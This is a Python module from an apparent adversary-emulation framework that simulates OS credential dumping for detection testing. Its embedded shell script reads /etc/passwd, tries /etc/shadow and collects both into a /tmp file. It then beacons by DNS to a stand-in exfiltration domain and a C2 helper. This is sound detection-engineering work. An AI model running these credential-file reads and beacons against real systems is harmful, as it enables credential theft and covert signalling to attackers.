# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
Attack: credential_dump — T1003 OS Credential Dumping / T1552.001 Credentials In Files

SAFE simulation: reads /etc/passwd (world-readable), attempts /etc/shadow read
(expected to fail or return minimal data), writes a fake credential dump file to /tmp.
No real credentials are extracted or exfiltrated.
"""

from __future__ import annotations

from typing import Any

from gloamfire.attacks.base import AttackResult, BaseAttack
from gloamfire.core.registry import register

_DNS_BEACON_DOMAIN = "cred-exfil-sim.gloamfire.invalid"


@register
class CredentialDumpAttack(BaseAttack):
    name = "credential_dump"
    description = "Simulate OS credential dumping from /etc/passwd and /etc/shadow (T1003)"
    mitre = ["T1003", "T1552.001"]

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        dump_file = params.get("dump_file", "/tmp/gloamfire_cred_sim.txt")
        resolver = params.get("resolver", "8.8.8.8")

        script = f"""
echo "[Gloamfire] Credential dump simulation starting"
echo "=== /etc/passwd ===" > {dump_file}
cat /etc/passwd >> {dump_file}
echo "=== /etc/shadow (attempt) ===" >> {dump_file}
cat /etc/shadow >> {dump_file} 2>/dev/null || echo "[shadow not readable — expected in container]" >> {dump_file}
echo "=== Memory credential scan (simulated) ===" >> {dump_file}
echo "[SIMULATION] No real memory dump — Gloamfire safe mode" >> {dump_file}
echo "Lines collected: $(wc -l < {dump_file})"
echo "[Gloamfire] Credential dump simulation complete"
"""
        result = self._exec(target, script)
        result.metadata["dump_file"] = dump_file

        # Unique DNS beacon → Suricata rule 9000020
        self._exec(
            target,
            f"nslookup {_DNS_BEACON_DOMAIN} {resolver} 2>/dev/null || true",
        )
        self._c2_beacon(target)
        self._write_attack_log(target, self.name)
        return result


@register
class CredentialDumpCleanup(BaseAttack):
    name = "credential_dump_cleanup"
    description = "Remove credential dump simulation artefacts"
    mitre = []

    def execute(self, target: str, params: dict[str, Any]) -> AttackResult:
        dump_file = params.get("dump_file", "/tmp/gloamfire_cred_sim.txt")
        return self._exec(target, f"rm -f {dump_file}")
